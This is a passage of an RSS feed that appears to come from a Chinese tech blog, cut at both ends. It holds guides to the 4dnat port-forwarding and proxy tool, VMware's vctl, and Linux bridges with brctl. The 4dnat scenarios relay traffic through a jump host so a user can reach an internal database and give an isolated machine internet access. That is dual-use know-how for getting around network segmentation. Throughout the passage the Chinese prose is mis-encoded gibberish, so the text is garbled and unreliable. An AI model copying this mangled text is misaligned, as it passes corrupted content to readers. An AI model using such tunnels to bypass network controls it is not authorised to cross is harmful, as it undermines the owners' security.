&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -forward &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt; 192.168.1.100:22
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ç›‘å¬æ¨¡å¼&#34;&gt;ç›‘å¬æ¨¡å¼&lt;/h3&gt;
&lt;p&gt;æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£1å’Œç›‘å¬ç«¯å£2ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -listen &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ä»£ç†äººæ¨¡å¼&#34;&gt;ä»£ç†äººæ¨¡å¼&lt;/h3&gt;
&lt;p&gt;æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›®æ ‡åœ°å€1å’Œç›®æ ‡åœ°å€2ï¼Œå¯åŠ¨åä¼šä¸»åŠ¨è¿æ¥è¿™ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -agent 127.0.0.1:10000 127.0.0.1:22
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;httphttpsä»£ç†æ¨¡å¼&#34;&gt;http/httpsä»£ç†æ¨¡å¼&lt;/h3&gt;
&lt;p&gt;æ¥å—ä¸¤ä¸ªå‚æ•°æˆ–å››ä¸ªå‚æ•°ï¼Œä»£ç†ç±»å‹ã€ç›‘å¬ç«¯å£ã€è¯ä¹¦è·¯å¾„å’Œç§é’¥è·¯å¾„ï¼Œç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;h4 id=&#34;httpä»£ç†&#34;&gt;httpä»£ç†&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -proxy http &lt;span style=&#34;color:#ae81ff&#34;&gt;1080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;httpsä»£ç†&#34;&gt;httpsä»£ç†&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -proxy https &lt;span style=&#34;color:#ae81ff&#34;&gt;1080&lt;/span&gt; server.crt server.key
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;ä½¿ç”¨åœºæ™¯&#34;&gt;ä½¿ç”¨åœºæ™¯&lt;/h1&gt;
&lt;h3 id=&#34;åœºæ™¯ä¸€&#34;&gt;åœºæ™¯ä¸€&lt;/h3&gt;
&lt;p&gt;æœŸæœ›å¯ä»¥åœ¨&lt;strong&gt;ç”¨æˆ·ç”µè„‘&lt;/strong&gt;ä¸Šç›´æ¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„3306ç«¯å£ï¼Œè·³æ¿æœºå™¨æ˜¯ä¸€å°Windowsæœºå™¨ï¼Œæ²¡åŠæ³•åšsshç«¯å£è½¬å‘ã€‚
&lt;img alt=&#34;è¯·è¾“å…¥å›¾ç‰‡æè¿°&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/break-through-the-network.png&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å•å‘è™šçº¿ç®­å¤´è¡¨ç¤ºå¯ä»¥å•å‘è®¿é—®ï¼Œåä¹‹ä¸è¡Œã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä½¿ç”¨4DNATåœ¨&lt;strong&gt;è·³æ¿æœºå™¨&lt;/strong&gt;ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤åšç«¯å£è½¬å‘&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æœ¬åœ°ç›‘å¬3307ç«¯å£ï¼Œæ¥æ”¶åˆ°è¯·æ±‚åä¸»åŠ¨è¿æ¥10.1.0.40çš„3306ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -forward &lt;span style=&#34;color:#ae81ff&#34;&gt;3307&lt;/span&gt; 10.1.0.40:3306
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨&lt;strong&gt;ç”¨æˆ·ç”µè„‘&lt;/strong&gt;ä¸Šè®¿é—®&lt;strong&gt;172.16.0.30:3307&lt;/strong&gt;å³ç­‰åŒäºè®¿é—®&lt;strong&gt;10.1.0.40:3306&lt;/strong&gt;ï¼Œäºæ˜¯å°±å¯ä»¥åœ¨&lt;strong&gt;ç”¨æˆ·ç”µè„‘&lt;/strong&gt;æ„‰å¿«çš„è®¿é—®&lt;strong&gt;ç›®æ ‡æœºå™¨&lt;/strong&gt;ä¸Šçš„æœåŠ¡å•¦ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åœºæ™¯äºŒ&#34;&gt;åœºæ™¯äºŒ&lt;/h3&gt;
&lt;p&gt;æœŸæœ›ç›®æ ‡&lt;strong&gt;ç›®æ ‡æœºå™¨&lt;/strong&gt;å¯ä»¥ä¸Šç½‘ï¼Œå¦‚ä½¿ç”¨yumå®‰è£…è½¯ä»¶ã€‚
&lt;img alt=&#34;è¯·è¾“å…¥å›¾ç‰‡æè¿°&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/break-through-the-network2.png&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åœ¨&lt;strong&gt;ç”¨æˆ·ç”µè„‘&lt;/strong&gt;ä¸Šå¼€å¯ä¸€ä¸ªhttpä»£ç†&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -proxy http &lt;span style=&#34;color:#ae81ff&#34;&gt;1080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;è·³æ¿æœºå™¨&lt;/strong&gt;ä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -listen &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;ç›®æ ‡æœºå™¨&lt;/strong&gt;ä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -listen &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;ç”¨æˆ·ç”µè„‘&lt;/strong&gt;ä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -agent 127.0.0.1:1080 172.16.0.30:10000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;è·³æ¿æœºå™¨&lt;/strong&gt;ä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ®&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./4dnat -agent 127.0.0.1:10001 10.1.0.40:20000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;ç›®æ ‡æœºå™¨&lt;/strong&gt;ä¸Šä¿®æ”¹ä»£ç†&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF &amp;gt;&amp;gt; /etc/profile
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;http_proxy=http://127.0.0.1:20001
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;https_proxy=http://127.0.0.1:20001
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;export http_proxy https_proxy
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;source /etc/profile
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;åœ¨&lt;strong&gt;ç›®æ ‡æœºå™¨&lt;/strong&gt;ä¸Šæµ‹è¯•è®¿é—®äº’è”ç½‘&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl https://typesafe.cn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åå¥‰ä¸Šé¡¹ç›®åœ°å€ &lt;a href=&#34;https://github.com/dushixiang/4dnat&#34;&gt;https://github.com/dushixiang/4dnat&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dockerï¼ŸVmwareï¼Ÿå°å­©å­æ‰åšé€‰æ‹©ï¼Œæ‰“å·¥äººæˆ‘å…¨éƒ½è¦ã€‚</title>
      <link>https://www.typesafe.cn/posts/docker-on-vmware/</link>
      <pubDate>Tue, 17 Nov 2020 15:39:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/docker-on-vmware/</guid>
      <description>&lt;h1 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h1&gt;
&lt;p&gt;ä½œä¸ºä¸€ä¸ªç§°èŒçš„æ‰“å·¥äººï¼Œç”µè„‘ä¸Šå¸¸å¤‡ä¸€ä¸ªVmwareä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹äº†ï¼Œä½†æ˜¯å®ƒå’ŒDocker for Windowsä¸å…¼å®¹å¾€å¾€å¾ˆè®©äººå¤´å¤§ã€‚é€šè¿‡æŸ¥æ‰¾èµ„æ–™ï¼Œå‘ç°æä¾›çš„è§£å†³æ–¹æ¡ˆå¤§è‡´æœ‰ä¸‰ç§&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆä½¿ç”¨Vmwareåˆ›å»ºä¸€å°Linuxè™šæ‹Ÿæœºï¼Œåœ¨è¿™å°Linuxè™šæ‹Ÿæœºä¸Šå†å®‰è£…dockerã€‚&lt;/li&gt;
&lt;li&gt;é…ç½®Vmwareä½œä¸ºDocker for Windowsçš„è¿è¡Œå¹³å°ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å¾®è½¯çš„Hyper-væ¥åˆ›å»ºè™šæ‹Ÿæœºã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯¹æˆ‘è€Œè¨€ï¼Œç¬¬ä¸€ç§ä¸å¤ªä¼˜é›…ï¼Œç¬¬äºŒç§é…ç½®ç¹çï¼Œç¬¬ä¸‰ç§ä¸ä¼šç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç›´åˆ°æˆ‘å‘ç°äº†vctlè¿™ä¸ªå¥½ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;h1 id=&#34;vctl-æ˜¯ä»€ä¹ˆ&#34;&gt;vctl æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;vctl æ˜¯ä¸€æ¬¾æ†ç»‘åœ¨Vmware Workstation Pro åº”ç”¨ç¨‹åºä¸­çš„å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œä»…åœ¨ Windows 10 1809 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šå—æ”¯æŒã€‚å¦‚æœ Workstation Pro æ‰€åœ¨ä¸»æœºä¸Šçš„ Windows æ“ä½œç³»ç»Ÿä½äº Windows 10 1809ï¼Œåˆ™å®ƒä¸æ”¯æŒ vctl CLIã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ç®€å•æ¥è¯´å®ƒå°±æ˜¯Vmwareä¸Šçš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ç”¨å®ƒæ¥ç®¡ç†å®¹å™¨ï¼Œä½¿ç”¨å‘½ä»¤åŸºæœ¬ä¸Šå’Œdockerä¸€è‡´ï¼Œåªéœ€è¦æŠŠ&lt;code&gt;docker &amp;lt;cmd&amp;gt;&lt;/code&gt;æ¢æˆ&lt;code&gt;vctl &amp;lt;cmd&amp;gt;&lt;/code&gt;å°±è¶³å¤Ÿäº†ã€‚Docker for Windowsï¼Ÿä¸éœ€è¦ã€‚ç°åœ¨å®¹å™¨éƒ½äº¤ç»™vctlæ¥ç®¡ç†äº†ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä½¿ç”¨vctlå‘½ä»¤å‰ï¼Œå’Œå¯åŠ¨dockerä¸€æ ·ï¼Œéœ€è¦å…ˆå¯åŠ¨vctlçš„å®ˆæŠ¤è¿›ç¨‹ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vctl system start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å½“éœ€è¦å…³é—­å®ˆæŠ¤è¿›ç¨‹æ—¶æ‰§è¡Œ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vctl system stop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯å’Œæ™®é€šçš„dockerå‘½ä»¤ä¸€æ ·äº†ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# æ‹‰å–é•œåƒ
vctl pull nginx

# æŸ¥çœ‹é•œåƒ
vctl images

# å¯åŠ¨å®¹å™¨
vctl --name some-nginx -d -p 8080:80 nginx

# æŸ¥çœ‹å®¹å™¨
vctl ps

# è¿›å…¥å®¹å™¨
vctl exec -it &amp;lt;cid&amp;gt; bash 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ›´å¤šä½¿ç”¨ä¿¡æ¯å¯å‚è€ƒVmwareçš„å®˜æ–¹æ–‡æ¡£ &lt;a href=&#34;https://docs.vmware.com/cn/VMware-Fusion/11/com.vmware.fusion.using.doc/GUID-78E7339F-7294-4F3E-9AD0-1E14C201FA40.html&#34;&gt;ä½¿ç”¨vctlå‘½ä»¤ç®¡ç†å®¹å™¨&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux Bridge è¯¦è§£</title>
      <link>https://www.typesafe.cn/posts/linux-bridge/</link>
      <pubDate>Fri, 13 Nov 2020 21:47:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-bridge/</guid>
      <description>&lt;h1 id=&#34;linux-bridge-è¯¦è§£&#34;&gt;Linux Bridge è¯¦è§£&lt;/h1&gt;
&lt;p&gt;Linux Bridgeï¼ˆç½‘æ¡¥ï¼‰æ˜¯ç”¨çº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œæœ‰ç€å’Œç‰©ç†äº¤æ¢æœºç›¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚äºŒå±‚äº¤æ¢ï¼ŒMACåœ°å€å­¦ä¹ ç­‰ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠtun/tapï¼Œveth pairç­‰è®¾å¤‡ç»‘å®šåˆ°ç½‘æ¡¥ä¸Šï¼Œå°±åƒæ˜¯æŠŠè®¾å¤‡è¿æ¥åˆ°ç‰©ç†äº¤æ¢æœºä¸Šä¸€æ ·ã€‚æ­¤å¤–å®ƒå’Œveth pairã€tun/tapä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¸€ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œå…·æœ‰è™šæ‹Ÿè®¾å¤‡çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä¾‹å¦‚é…ç½®IPï¼ŒMACåœ°å€ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;Linux Bridgeé€šå¸¸æ˜¯æ­é…KVMã€dockerç­‰è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€èµ·ä½¿ç”¨çš„ï¼Œç”¨äºæ„å»ºè™šæ‹Ÿç½‘ç»œï¼Œå› ä¸ºæ­¤æ•™ç¨‹ä¸æ¶‰åŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨å‰é¢å­¦ä¹ è¿‡çš„netnsæ¥æ¨¡æ‹Ÿè™šæ‹Ÿè®¾å¤‡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¦‚ä½•ä½¿ç”¨linux-bridge&#34;&gt;å¦‚ä½•ä½¿ç”¨Linux Bridgeï¼Ÿ&lt;/h2&gt;
&lt;p&gt;æ“ä½œç½‘æ¡¥æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹é€šè¿‡&lt;strong&gt;bridge-utils&lt;/strong&gt;æ¥æ“ä½œï¼Œç”±äºå®ƒä¸æ˜¯Linuxç³»ç»Ÿè‡ªå¸¦çš„å·¥å…·ï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥å®‰è£…å®ƒã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y bridge-utils
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ubuntu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install -y bridge-utils
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨&lt;code&gt;brctl help&lt;/code&gt;æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;never heard of command &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;help&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: brctl &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;commands&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;commands:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	addbr     	&amp;lt;bridge&amp;gt;		add bridge
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	delbr     	&amp;lt;bridge&amp;gt;		delete bridge
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	addif     	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	delif     	&amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	hairpin   	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;on|off&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;	turn hairpin on/off
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setageing 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set ageing time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;		set bridge priority
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setfd     	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set bridge forward delay
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sethello  	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set hello time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setmaxage 	&amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;		set max message age
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	set path cost
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	set port priority
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	show      	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &amp;lt;bridge&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;		show a list of bridges
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	showmacs  	&amp;lt;bridge&amp;gt;		show a list of mac addrs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	showstp   	&amp;lt;bridge&amp;gt;		show bridge stp info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	stp       	&amp;lt;bridge&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;on|off&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;	turn stp on/off
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¸¸ç”¨å‘½ä»¤å¦‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux veth pair è¯¦è§£</title>
      <link>https://www.typesafe.cn/posts/linux-veth-pair/</link>
      <pubDate>Mon, 09 Nov 2020 22:45:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/linux-veth-pair/</guid>
